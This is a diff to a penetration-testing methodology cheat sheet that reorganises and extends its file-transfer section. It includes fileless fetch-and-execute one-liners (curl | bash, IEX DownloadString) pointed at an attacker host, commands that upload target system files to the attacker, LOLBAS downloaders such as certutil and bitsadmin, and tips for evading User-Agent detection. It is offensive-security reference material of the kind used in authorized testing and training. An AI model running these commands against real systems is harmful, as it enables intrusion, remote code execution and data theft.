@@ -101,16 +101,19 @@
     - `4.4.2` Bind shells
     - `4.4.3` Web shells
     - `4.4.4` TTY upgrade
-  - `4.5` **File Transfer (Agnostic — Windows & Linux)**
+  - `4.5` **File Transfer (Windows & Linux)**
     - `4.5.1` Base64 encode/decode
     - `4.5.2` Web download/upload (HTTP/HTTPS)
     - `4.5.3` SMB (TCP/445)
     - `4.5.4` WebDAV (SMB over HTTP)
-    - `4.5.5` FTP (TCP/21)
-  - `4.6` **File Transfer (Linux ⇄ Linux)**
-    - `4.6.1` Hosting a web server for downloads
-    - `4.6.2` Bash /dev/tcp download
-    - `4.6.3` SSH / SCP (download & upload)
+    - `4.5.5` FTP (TCP/21, 20)
+    - `4.5.6` Bash /dev/tcp download (Linux target)
+    - `4.5.7` SSH / SCP (download & upload)
+    - `4.5.8` Ncat (raw TCP transfer)
+    - `4.5.9` PowerShell Remoting (WinRM) session transfer (Windows target)
+    - `4.5.10` RDP — shared drive mount (xfreerdp)
+    - `4.5.11` Encrypting files before transfer
+    - `4.5.12` Living off the Land (LOLBAS / GTFOBins) file transfer
 - `5` **Active Directory Enumeration**
   - `5.1` ldapdomaindump
   - `5.2` BloodHound
@@ -2276,9 +2279,9 @@ stty rows <ROWS> columns <COLS>
 
 </details>
 
-### 4.5 File Transfer (Agnostic — Windows & Linux)
+### 4.5 File Transfer (Windows & Linux)
 
-Every method works both directions — download (target pulls a file from the attacker) and upload (target pushes a file back) — between Windows and Linux targets alike and Linux ⇄ Linux. Each technique shows the Windows and Linux versions side by side, so pick the client that matches the OS on each end; the attacker-side server commands are the same regardless. Choose by what egress the target allows (HTTP/HTTPS is almost always out; SMB 445 is commonly blocked, in which case use WebDAV) and by the shell you hold (non-interactive shells need command files or one-liners rather than interactive prompts).
+Assume the attacker is a Linux box (Kali) that starts the server or listener; the target is either Windows or Linux. Every technique follows the same pattern — server command on the attacker first, then the target-side client commands, shown for Windows and Linux separately only where they differ. Most methods work both directions: download (target pulls a file from the attacker) and upload (target pushes a file back). Choose by what egress the target allows (HTTP/HTTPS is almost always out; SMB 445 is commonly blocked, in which case use WebDAV) and by the shell you hold (non-interactive shells need command files or one-liners rather than interactive prompts). Techniques that only work on one target OS are flagged, e.g. bash `/dev/tcp` (4.5.6) is Linux-only.
 
 #### 4.5.1 Base64 encode/decode
 
@@ -2340,6 +2343,26 @@ Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 
 #### 4.5.2 Web download/upload (HTTP/HTTPS)
 
+**Attacker — host a web server for downloads:**
+
+```bash
+python3 -m http.server
+```
+
+```bash
+python2.7 -m SimpleHTTPServer
+```
+
+```bash
+php -S 0.0.0.0:8000
+```
+
+```bash
+ruby -run -ehttpd . -p8000
+```
+
+Serves the current directory for the target to pull files from — a Linux attacker box almost always has python, php, or ruby, so this works without a full web server install. These mini-servers lack auth and TLS; serve from the directory containing the files to expose and bind `0.0.0.0`.
+
 **Attacker — host an upload server (HTTP):**
 
 ```bash
@@ -2358,13 +2381,6 @@ mkdir https && cd https
 sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 ```
 
-**Download — Linux target:**
-
-```bash
-wget https://<ATTACKER_IP>/<FILE> -O /tmp/<FILE>
-curl -o /tmp/<FILE> https://<ATTACKER_IP>/<FILE>
-```
-
 **Download — Windows target:**
 
 ```powershell
@@ -2373,11 +2389,84 @@ curl -o /tmp/<FILE> https://<ATTACKER_IP>/<FILE>
 Invoke-WebRequest '<URL>' -OutFile <OUTPUT_FILE>
 ```
 
-**Fileless execution — Linux target:**
+Consider changing the User-Agent to a browser string so the request blends in with normal traffic and evades UA-based detection (blue-team-methodology.md §8.3):
+
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest '<URL>' -OutFile <OUTPUT_FILE> -UserAgent $UserAgent
+```
+
+`PSUserAgent` also exposes `InternetExplorer`, `FireFox`, `Opera`, and `Safari`.
+
+Caveat: these PSUserAgent strings are frozen from ~2010 (`Chrome/7.0.500.0`, `Firefox/4.0`) — a decade-old browser UA can be *more* suspicious to an analyst than the default `WindowsPowerShell` UA (both are flagged in blue-team-methodology.md §8.3).
+
+**Download — Windows target (cscript — JavaScript/VBScript):**
+
+Default Windows apps (`cscript.exe`) execute JS/VBScript — a fallback when PowerShell execution policy blocks `Net.WebClient` cradles. Save `wget.js` on the target:
+
+```javascript
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+
+```cmd
+cscript.exe /nologo wget.js https://<ATTACKER_IP>/<FILE> <OUTPUT_FILE>
+```
+
+Save `wget.vbs` on the target:
+
+```vbscript
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+
+```cmd
+cscript.exe /nologo wget.vbs https://<ATTACKER_IP>/<FILE> <OUTPUT_FILE>
+```
+
+**Download — Linux target:**
 
 ```bash
-curl https://<ATTACKER_IP>/<FILE> | bash
-wget -qO- https://<ATTACKER_IP>/<FILE> | python3
+wget https://<ATTACKER_IP>/<FILE> -O /tmp/<FILE>
+curl -o /tmp/<FILE> https://<ATTACKER_IP>/<FILE>
+```
+
+When wget/curl are missing, download with an installed interpreter — Python, PHP, Ruby, and Perl are commonly present on Linux distributions (Python 2.7 still lingers on older servers; Python 3 is current):
+
+```bash
+python2.7 -c 'import urllib;urllib.urlretrieve("https://<ATTACKER_IP>/<FILE>", "<FILE>")'
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://<ATTACKER_IP>/<FILE>", "<FILE>")'
+```
+
+```bash
+php -r '$file = file_get_contents("https://<ATTACKER_IP>/<FILE>"); file_put_contents("<FILE>",$file);'
+```
+
+```bash
+php -r 'const BUFFER = 1024; $fremote = fopen("https://<ATTACKER_IP>/<FILE>", "rb"); $flocal = fopen("<FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+```
+
+```bash
+ruby -e 'require "net/http"; File.write("<FILE>", Net::HTTP.get(URI.parse("https://<ATTACKER_IP>/<FILE>")))'
+```
+
+```bash
+perl -e 'use LWP::Simple; getstore("https://<ATTACKER_IP>/<FILE>", "<FILE>");'
 ```
 
 **Fileless execution — Windows target:**
@@ -2387,11 +2476,15 @@ IEX (New-Object Net.WebClient).DownloadString('<URL>')
 (New-Object Net.WebClient).DownloadString('<URL>') | IEX
 ```
 
-**Upload — Linux target:**
+**Fileless execution — Linux target:**
 
 ```bash
-curl -X POST https://<ATTACKER_IP>/upload -F 'files=@<FILE>' -F 'files=@<FILE2>' --insecure
+curl https://<ATTACKER_IP>/<FILE> | bash
+wget -qO- https://<ATTACKER_IP>/<FILE> | python3
+php -r '$lines = @file("https://<ATTACKER_IP>/<FILE>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
+
+Note: with `@file`, the URL can be used as a filename if PHP's `allow_url_fopen` (fopen wrappers) is enabled.
 
 **Upload — Windows target:**
 
@@ -2410,18 +2503,30 @@ nc -lvnp 8000
 echo '<b64>' | base64 -d -w 0 > <OUT>
 ```
 
+**Upload — Linux target:**
+
+```bash
+curl -X POST https://<ATTACKER_IP>/upload -F 'files=@<FILE>' -F 'files=@<FILE2>' --insecure
+python3 -c 'import requests;requests.post("http://<ATTACKER_IP>:8000/upload",files={"files":open("<FILE>","rb")})'
+```
+
+Note: the `requests` module must be installed on the target — same idea works with any language that can send an HTTP multipart POST.
+
 <details>
 <summary>Details</summary>
 
 **Description**
 
 - HTTP/HTTPS is almost always permitted outbound, making this the default transfer method.
-- Download (attacker → target): the target pulls a file from an attacker-hosted web server with wget/curl (Linux) or `Net.WebClient`/`Invoke-WebRequest` (Windows), or runs it filelessly via a pipe to an interpreter (`curl | bash`, `DownloadString | IEX`).
-- Upload (target → attacker): serve an upload page with Python's `uploadserver` (HTTP or HTTPS) and POST files with `curl` (Linux) or `PSUpload.ps1` (Windows), or base64-encode the file and POST it to a `nc` listener.
-- To host files for download (not upload), use the mini web servers in 4.6.1.
+- Download (attacker → target): the target pulls a file from an attacker-hosted web server with wget/curl or an installed-interpreter one-liner (Python/PHP/Ruby/Perl, Linux) or `Net.WebClient`/`Invoke-WebRequest`/cscript JS-VBScript (Windows), or runs it filelessly via a pipe to an interpreter (`curl | bash`, PHP `@file() | bash`, `DownloadString | IEX`).
+- Upload (target → attacker): serve an upload page with Python's `uploadserver` (HTTP or HTTPS) and POST files with `curl` or a Python `requests` one-liner (Linux) or `PSUpload.ps1` (Windows), or base64-encode the file and POST it to a `nc` listener.
 
 **Parameters**
 
+- `python3 -m http.server` — Serves the current directory on 0.0.0.0:8000 (default port) for downloads.
+- `python2.7 -m SimpleHTTPServer` — Python 2 equivalent module.
+- `php -S 0.0.0.0:8000` — PHP built-in development server.
+- `ruby -run -ehttpd . -p8000` — Ruby WEBrick server serving `.` on port 8000.
 - `python3 -m uploadserver` — Serves an upload page at `/upload` on port 8000.
 - `openssl req -x509 ...` — Generates a self-signed certificate + key in one PEM file.
 - `python3 -m uploadserver 443 --server-certificate ~/server.pem` — Serves HTTPS with an upload page at `/upload` on port 443.
@@ -2431,10 +2536,20 @@ echo '<b64>' | base64 -d -w 0 > <OUT>
 - `Invoke-WebRequest '<URL>' -OutFile <FILE>` — Windows download to disk; aliases `iwr`, `curl`, `wget`, but slower.
 - `curl <URL> | bash` — Linux fileless execution via pipe.
 - `wget -qO- <URL> | python3` — Linux fileless; `-q` quiet, `-O-` prints to stdout.
+- `python2.7 -c 'import urllib;urllib.urlretrieve(...)'` — Python 2 download one-liner.
+- `python3 -c 'import urllib.request;urllib.request.urlretrieve(...)'` — Python 3 download one-liner.
+- `php -r '...file_get_contents()/file_put_contents()...'` — PHP download to disk in one call.
+- `php -r '...fopen()/fread()/fwrite()...'` — PHP buffered streaming download (`BUFFER` of 1024 bytes per read).
+- `ruby -e '...Net::HTTP...'` — Ruby download one-liner via `net/http`.
+- `perl -e '...LWP::Simple...'` — Perl download one-liner via `getstore`.
+- `php -r '$lines = @file(...); ... | bash` — PHP fileless execution piped to bash.
+- `cscript.exe /nologo wget.js <URL> <OUT>` — Runs the JS `wget.js` with cscript to download a file (needs `WinHttp`/`ADODB.Stream` ActiveX objects).
+- `cscript.exe /nologo wget.vbs <URL> <OUT>` — Runs the VBScript `wget.vbs` with cscript to download a file (`Microsoft.XMLHTTP` + `Adodb.Stream`).
 - `IEX (New-Object Net.WebClient).DownloadString('<URL>')` — Windows fileless in-memory cradle (also `DownloadString(...) | IEX`).
 - `IEX(New-Object Net.WebClient).DownloadString('...PSUpload.ps1')` — Loads the PSUpload.ps1 helper (defines `Invoke-FileUpload`).
 - `Invoke-FileUpload -Uri ... -File <FILE>` — PSUpload.ps1 helper that POSTs a file to the upload server.
 - `curl -X POST https://<IP>/upload -F 'files=@<FILE>'` — Linux upload; repeat `-F 'files=@...'` for multiple files; `--insecure` skips cert validation.
+- `python3 -c 'import requests;requests.post("http://<IP>:8000/upload",files={"files":open("<FILE>","rb")})'` — Linux upload one-liner using the Python `requests` module.
 - `[System.convert]::ToBase64String(...)` / `Get-Content -Encoding Byte` — Base64-encode a file for POSTing.
 - `nc -lvnp 8000` — Captures the POST body on the attacker.
 - `base64 -d -w 0` — Decodes the captured base64 back to a file.
@@ -2446,6 +2561,9 @@ echo '<b64>' | base64 -d -w 0 > <OUT>
 - Untrusted SSL/TLS cert error — bypass with `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`.
 - Web filtering may block categories, file types (e.g. `.exe`), or non-whitelisted domains.
 - Fileless variants never touch disk; `DownloadFile`, wget, and curl do.
+- Interpreter downloads depend on what's installed on the target (Python/PHP/Ruby/Perl on Linux) — slower than wget/curl but work when those are missing.
+- `cscript.exe` ships by default with Windows (VBScript has been included since Windows 98) and also runs JavaScript — a fallback when PowerShell is restricted; the JS/VBScript files are created first, then executed.
+- The Python upload one-liner needs the `requests` module installed on the target.
 - Keep `server.pem` out of the web root — serve it from a separate directory (`mkdir https && cd https`).
 - See Harmj0y's PowerShell download cradles list (https://gist.github.com/HarmJ0y/bb48307ffa663256e239) — cradles differ in proxy awareness and disk touch.
 
@@ -2466,12 +2584,6 @@ net use n: \\<ATTACKER_IP>\share /user:test test
 copy n:\nc.exe
 ```
 
-**Upload — Windows target:**
-
-```cmd
-copy <FILE> \\<ATTACKER_IP>\share\
-```
-
 **Download — Linux target:**
 
 ```bash
@@ -2480,6 +2592,12 @@ smbclient //<ATTACKER_IP>/<SHARE> -c 'get <FILE>'
 
 ```bash
 sudo mount -t cifs //<ATTACKER_IP>/<SHARE> /mnt -o username=<USER>,password=<PASS>
+```
+
+**Upload — Windows target:**
+
+```cmd
+copy <FILE> \\<ATTACKER_IP>\share\
 ```
 
 **Upload — Linux target:**
@@ -2582,17 +2700,17 @@ sudo python3 -m pyftpdlib --port 21 --write
 (New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/file.txt','C:\Users\Public\ftp-file.txt')
 ```
 
-**Upload — Windows target:**
-
-```powershell
-(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/ftp-hosts','C:\Windows\System32\drivers\etc\hosts')
-```
-
 **Download — Linux target:**
 
 ```bash
 wget ftp://<ATTACKER_IP>/<FILE> -O <OUTPUT>
 curl ftp://<ATTACKER_IP>/<FILE> -o <OUTPUT>
+```
+
+**Upload — Windows target:**
+
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/ftp-hosts','C:\Windows\System32\drivers\etc\hosts')
 ```
 
 **Upload — Linux target:**
@@ -2645,60 +2763,7 @@ ftp -v -n -s:ftpcommand.txt
 
 </details>
 
-### 4.6 File Transfer (Linux ⇄ Linux)
-
-OS-agnostic techniques (base64 4.5.1, web 4.5.2, SMB 4.5.3, FTP 4.5.5) already cover both Windows and Linux targets — for Linux ⇄ Linux only the target-side client changes, and the attacker-side server commands stay the same. This section covers the methods specific to Linux targets or to a Linux attacker box: mini web servers, bash built-ins, and SSH/SCP. HTTP/HTTPS is almost always permitted outbound and most Linux malware uses it, so pair the web server in 4.6.1 with the download/upload clients in 4.5.2; SSH (TCP/22) is frequently allowed where SMB/FTP are blocked.
-
-#### 4.6.1 Hosting a web server for downloads
-
-```bash
-python3 -m http.server
-```
-
-```bash
-python2.7 -m SimpleHTTPServer
-```
-
-```bash
-php -S 0.0.0.0:8000
-```
-
-```bash
-ruby -run -ehttpd . -p8000
-```
-
-**Target pulls the file:**
-
-```bash
-wget <ATTACKER_IP>:8000/filetotransfer.txt
-```
-
-<details>
-<summary>Details</summary>
-
-**Description**
-
-- Stands up a quick HTTP server serving the current directory, letting a target download files from the attacker without a full web server install.
-- A compromised Linux box almost always has python, php, or ruby, so this works even when a full web server is missing — a capability Windows targets rarely have.
-- This is the download half of 4.5.2: any OS target can pull from this server (Windows via `Net.WebClient`/`iwr`, Linux via wget/curl), but only a Linux box can start these servers.
-
-**Parameters**
-
-- `python3 -m http.server` — Serves the current directory on 0.0.0.0:8000 (default port).
-- `python2.7 -m SimpleHTTPServer` — Python 2 equivalent module.
-- `php -S 0.0.0.0:8000` — PHP built-in development server.
-- `ruby -run -ehttpd . -p8000` — Ruby WEBrick server serving `.` on port 8000.
-- `wget <ATTACKER_IP>:8000/<FILE>` — Target-side fetch; the target downloads *from* us.
-
-**Notes**
-
-- Direction matters: here the target **pulls** the file (outbound from the target), which is more likely to be permitted than inbound uploads.
-- Serve from the directory containing the files you want to expose; bind `0.0.0.0` so the target can reach the listener.
-- These mini-servers lack auth and TLS — don't expose sensitive data on them.
-
-</details>
-
-#### 4.6.2 Bash /dev/tcp download
+#### 4.5.6 Bash /dev/tcp download (Linux target)
 
 ```bash
 exec 3<>/dev/tcp/10.10.10.32/80
@@ -2734,7 +2799,7 @@ cat <&3
 
 </details>
 
-#### 4.6.3 SSH / SCP (download & upload)
+#### 4.5.7 SSH / SCP (download & upload)
 
 **Attacker-side server setup:**
 
@@ -2763,6 +2828,7 @@ scp /etc/passwd <USER>@<TARGET_IP>:/home/<USER>/
 
 - SCP rides on the SSH protocol, so it is available wherever `sshd` runs and often works outbound when SMB/FTP are blocked.
 - Works in either direction depending on which host runs the SSH server.
+- Linux ⇄ Windows: Windows 10 1809+ ships an OpenSSH `scp.exe`, and PuTTY's `pscp` works on older Windows — so SCP is not strictly Linux-only.
 
 **Parameters**
 
@@ -2776,6 +2842,296 @@ scp /etc/passwd <USER>@<TARGET_IP>:/home/<USER>/
 - Create a temporary user account for file transfers instead of using your primary credentials or keys on a remote computer.
 - `scp` prompts for a password — needs an interactive shell (or `sshpass -p <PASS>` for non-interactive shells).
 - `scp -i <KEY>` authenticates with an SSH private key instead of a password.
+
+</details>
+
+#### 4.5.8 Ncat (raw TCP transfer)
+
+Modern **Ncat** only — not the old Netcat (on the target it may be invoked as `nc`, `ncat`, or `netcat`). `--send-only`/`--recv-only` close the connection cleanly once the transfer finishes. Works on both Windows and Linux targets when `ncat` is present. Either side can listen — use target-listens when the attacker can reach the target inbound, attacker-listens when the target's inbound is firewalled (the target only needs outbound).
+
+**Download — target listens, attacker pushes:**
+
+```bash
+ncat -l -p 8000 --recv-only > <FILE>
+```
+
+```bash
+ncat --send-only <TARGET_IP> 8000 < <FILE>
+```
+
+**Download — attacker listens, target pulls (inbound firewall bypass):**
+
+```bash
+sudo ncat -l -p 443 --send-only < <FILE>
+```
+
+```bash
+ncat <ATTACKER_IP> 443 --recv-only > <FILE>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Raw TCP file transfer with Ncat when HTTP, SMB, or FTP servers are unavailable.
+- First block: the target listens and the attacker connects and sends (`--send-only` on the sender closes once the input is exhausted; `--recv-only` on the listener exits once the data is received).
+- Second block: the attacker listens and the target connects to receive — useful when a firewall blocks inbound connections to the target.
+
+**Parameters**
+
+- `ncat -l -p <PORT> --recv-only > <FILE>` — Target listens and writes the received stream to disk, then exits.
+- `ncat --send-only <IP> <PORT> < <FILE>` — Sender that exits once its input is exhausted.
+- `sudo ncat -l -p <PORT> --send-only < <FILE>` — Attacker-side listener that exits once the file is sent.
+- `ncat <IP> <PORT> --recv-only > <FILE>` — Receiver connecting to the listening side.
+
+**Notes**
+
+- Raw, unauthenticated, unencrypted traffic; Ncat adds TLS with `--ssl` on both sides if needed.
+- The same operation moves files in reverse (target → attacker) by swapping which side sends and receives.
+
+</details>
+
+#### 4.5.9 PowerShell Remoting (WinRM) session transfer (Windows target)
+
+Windows-only. Uses PowerShell Remoting to move files between Windows hosts over WinRM (TCP 5985 HTTP / 5986 HTTPS) when HTTP/HTTPS/SMB egress is unavailable. Requires administrative access, Remote Management Users membership, or explicit PowerShell Remoting permissions in the session configuration.
+
+**Confirm WinRM port is open:**
+
+```powershell
+Test-NetConnection -ComputerName <REMOTE_HOST> -Port 5985
+```
+
+**Create a PowerShell session:**
+
+```powershell
+$Session = New-PSSession -ComputerName <REMOTE_HOST>
+```
+
+**Copy a file into the remote session (upload):**
+
+```powershell
+Copy-Item -Path <FILE> -ToSession $Session -Destination <DEST>
+```
+
+**Copy a file out of the remote session (download):**
+
+```powershell
+Copy-Item -Path <REMOTE_FILE> -Destination <LOCAL_DEST> -FromSession $Session
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- PowerShell Remoting (WinRM) lets you copy files between Windows hosts over an existing `PSSession` — a fallback when HTTP, HTTPS, or SMB are unavailable.
+- `New-PSSession` opens the session; `Copy-Item` with `-ToSession`/`-FromSession` moves files in either direction.
+
+**Parameters**
+
+- `Test-NetConnection -ComputerName <HOST> -Port 5985` — Checks WinRM reachability (5985 HTTP, 5986 HTTPS).
+- `New-PSSession -ComputerName <HOST>` — Opens a PowerShell Remoting session to the remote host.
+- `Copy-Item -ToSession $Session -Destination <DEST>` — Copies a local file into the session host.
+- `Copy-Item -FromSession $Session -Destination <DEST>` — Copies a file from the session host back.
+
+**Notes**
+
+- Needs admin, Remote Management Users membership, or explicit session-config permissions; defaults to TCP 5985 (HTTP) / 5986 (HTTPS).
+- If the current session already has privileges over the remote host, no credentials are needed.
+- Files are written to disk on the remote host — this is not fileless.
+
+</details>
+
+#### 4.5.10 RDP — shared drive mount (xfreerdp)
+
+Mounts a local folder into the RDP session so files can be copied to and from the remote desktop without relying on clipboard copy/paste (which is flaky with xfreerdp). Requires an RDP session to a Windows target — see 4.3.1 for the base connection.
+
+```bash
+xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:<USER> /p:'<PASSWORD>' /drive:linux,<LOCAL_PATH> /cert:ignore
+```
+
+The mounted folder appears as `\\tsclient\linux` in the remote session, usable for transfer in both directions.
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- RDP file transfer by mounting a local directory into the session with xfreerdp's `/drive:` flag.
+- The share shows up in the remote session under `\\tsclient\<NAME>`, letting you copy files to and from the RDP session.
+
+**Parameters**
+
+- `xfreerdp /v:<IP> /d:<DOMAIN> /u:<USER> /p:'<PASS>'` — Connect with credentials (see 4.3.1).
+- `/drive:linux,<LOCAL_PATH>` — Shares the local folder into the session; `linux` is the share name shown under `\\tsclient\`.
+- `\\tsclient\linux` — UNC path to the mounted share inside the remote session.
+
+**Notes**
+
+- Only the user of the session can see the mounted drive — other users logged on to the target cannot, even if they hijack the RDP session.
+- Windows Defender on the target may delete malware shared through the mounted folder.
+- Clipboard copy/paste is an alternative but is unreliable with xfreerdp.
+
+</details>
+
+#### 4.5.11 Encrypting files before transfer
+
+Best practice: sensitive data pulled from the target (credentials, NTDS.dit, enumeration output, AD info) should be encrypted before it moves, or transferred over an encrypted transport (SSH/SFTP/HTTPS). Most methods in 4.5 send plaintext — base64 (4.5.1) and plain HTTP (4.5.2) are readable if intercepted.
+
+**Encrypt — Windows (Invoke-AESEncryption.ps1, AES-256-CBC):**
+
+Define the function in-memory with the one-liner below (paste into the target's PowerShell session — no file needed), or save it as `Invoke-AESEncryption.ps1` and import it:
+
+```powershell
+function Invoke-AESEncryption {[CmdletBinding()][OutputType([string])]Param([Parameter(Mandatory = $true)][ValidateSet('Encrypt', 'Decrypt')][String]$Mode,[Parameter(Mandatory = $true)][String]$Key,[Parameter(Mandatory = $true, ParameterSetName = "CryptText")][String]$Text,[Parameter(Mandatory = $true, ParameterSetName = "CryptFile")][String]$Path);Begin {$shaManaged = New-Object System.Security.Cryptography.SHA256Managed;$aesManaged = New-Object System.Security.Cryptography.AesManaged;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC;$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;$aesManaged.BlockSize = 128;$aesManaged.KeySize = 256};Process {$aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key));switch ($Mode) {'Encrypt' {if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)};if ($Path) {$File = Get-Item -Path $Path -ErrorAction SilentlyContinue;if (!$File.FullName) {Write-Error -Message "File not found!";break};$plainBytes = [System.IO.File]::ReadAllBytes($File.FullName);$outPath = $File.FullName + ".aes"};$encryptor = $aesManaged.CreateEncryptor();$encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length);$encryptedBytes = $aesManaged.IV + $encryptedBytes;$aesManaged.Dispose();if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)};if ($Path) {[System.IO.File]::WriteAllBytes($outPath, $encryptedBytes);(Get-Item $outPath).LastWriteTime = $File.LastWriteTime;return "File encrypted to $outPath"}}'Decrypt' {if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)};if ($Path) {$File = Get-Item -Path $Path -ErrorAction SilentlyContinue;if (!$File.FullName) {Write-Error -Message "File not found!";break};$cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName);$outPath = $File.FullName -replace ".aes"};$aesManaged.IV = $cipherBytes[0..15];$decryptor = $aesManaged.CreateDecryptor();$decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16);$aesManaged.Dispose();if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)};if ($Path) {[System.IO.File]::WriteAllBytes($outPath, $decryptedBytes);(Get-Item $outPath).LastWriteTime = $File.LastWriteTime;return "File decrypted to $outPath"}}}};End {$shaManaged.Dispose();$aesManaged.Dispose()}}
+```
+
+```powershell
+Import-Module .\Invoke-AESEncryption.ps1
+```
+
+**Encrypt a file (outputs `<FILE>.aes`):**
+
+```powershell
+Invoke-AESEncryption -Mode Encrypt -Key "<KEY>" -Path <FILE>
+```
+
+**Decrypt a file:**
+
+```powershell
+Invoke-AESEncryption -Mode Decrypt -Key "<KEY>" -Path <FILE>.aes
+```
+
+**String mode (returns / accepts base64 ciphertext):**
+
+```powershell
+Invoke-AESEncryption -Mode Encrypt -Key "<KEY>" -Text "<TEXT>"
+Invoke-AESEncryption -Mode Decrypt -Key "<KEY>" -Text "<BASE64_CIPHERTEXT>"
+```
+
+**Encrypt — Linux (openssl, AES-256-CBC + PBKDF2):**
+
+```bash
+openssl enc -aes256 -iter 100000 -pbkdf2 -in <FILE> -out <FILE>.enc
+```
+
+```bash
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <FILE>.enc -out <FILE>
+```
+
+Both commands prompt for a password.
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Encrypt sensitive files before transfer so they cannot be read if intercepted in transit; prefer an encrypted transport (HTTPS, SFTP, SSH) when available.
+- Windows: `Invoke-AESEncryption.ps1` (AES-256-CBC) encrypts files to `.aes` or strings to base64.
+- Linux: `openssl enc` with AES-256-CBC, PBKDF2 (`-pbkdf2`), and 100,000 iterations.
+
+**Parameters**
+
+- `Import-Module .\Invoke-AESEncryption.ps1` — Loads the PowerShell encryption function.
+- `Invoke-AESEncryption -Mode Encrypt -Key <KEY> -Path <FILE>` — Encrypts the file to `<FILE>.aes`; `-Mode Decrypt -Path <FILE>.aes` reverses it.
+- `Invoke-AESEncryption -Mode Encrypt -Text <TEXT>` — Encrypts a string, returning base64; `-Mode Decrypt -Text <BASE64>` reverses it.
+- `openssl enc -aes256 -iter 100000 -pbkdf2 -in <FILE> -out <OUT>` — Encrypts with AES-256-CBC; `-iter` sets PBKDF2 iterations, `-pbkdf2` selects the PBKDF2 key derivation. Prompts for a password.
+- `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <FILE>.enc -out <FILE>` — Decrypts; `-d` and the cipher/iteration flags must match the encrypt command.
+
+**Notes**
+
+- Canonical full `Invoke-AESEncryption.ps1` script: https://gist.githubusercontent.com/ddumicz/909d98a0e794a42326d5fcd6d9f2c4ad/raw (also packaged in DRTools on the PowerShell Gallery) — download it on the attacker box with wget/curl (4.5.2), transfer with any 4.5 method, or fetch directly on the target with `IEX (New-Object Net.WebClient).DownloadString('<URL>')`.
+- Transfer the encryption tool itself to the target with any 4.5 method, then encrypt locally so only ciphertext travels.
+- `Invoke-AESEncryption` on a file preserves the original's LastWriteTime, and the IV is prepended to the ciphertext (first 16 bytes). File mode keeps zero-padding, so the decrypted file may be a few bytes longer than the original.
+
+</details>
+
+#### 4.5.12 Living off the Land (LOLBAS / GTFOBins) file transfer
+
+Use binaries already present on the target instead of dropping our own tooling. The two aggregators are **LOLBAS** (Windows binaries, https://lolbas-project.github.io/) and **GTFOBins** (Linux binaries, https://gtfobins.github.io/) — both linked in 9. Useful Resources (also referenced for privesc in 8.3). Filter by function: LOLBAS uses `/download` and `/upload`; GTFOBins uses `+file download` and `+file upload`.
+
+**Upload — Windows target (certreq.exe, LOLBAS):**
+
+Attacker catches the POST body:
+
+```bash
+sudo nc -lvnp 8000
+```
+
+```cmd
+certreq.exe -Post -config http://<ATTACKER_IP>:8000/ c:\windows\win.ini
+```
+
+The file's contents arrive in the `nc` session as the POST body — copy-paste them out. Note: some certreq versions lack the `-Post` parameter.
+
+**Download — Windows target (certutil.exe, LOLBAS):**
+
+```cmd
+certutil.exe -urlcache -split -f http://<ATTACKER_IP>:8000/<FILE>
+```
+
+Long the de-facto "wget" for Windows (available in every version), but AMSI flags this usage as malicious.
+
+**Download — Windows target (BITS, LOLBAS):**
+
+```cmd
+bitsadmin /transfer <NAME> /priority foreground http://<ATTACKER_IP>:8000/<FILE> C:\Windows\Temp\<FILE>
+```
+
+```powershell
+Import-Module bitstransfer
+Start-BitsTransfer -Source "http://<ATTACKER_IP>:8000/<FILE>" -Destination "C:\Windows\Temp\<FILE>"
+```
+
+**Download — Windows target (GfxDownloadWrapper.exe):**
+
+```powershell
+GfxDownloadWrapper.exe "http://<ATTACKER_IP>/<FILE>" "C:\Temp\<FILE>"
+```
+
+Shipped by the Intel Graphics Driver for Windows 10 on some systems and normally used to fetch config files periodically — so it may be allowed by application whitelisting and excluded from alerting.
+
+**Download — Linux target (openssl, GTFOBins):**
+
+Attacker generates a cert and serves the file "nc style":
+
+```bash
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < <FILE>
+```
+
+```bash
+openssl s_client -connect <ATTACKER_IP>:80 -quiet > <FILE>
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
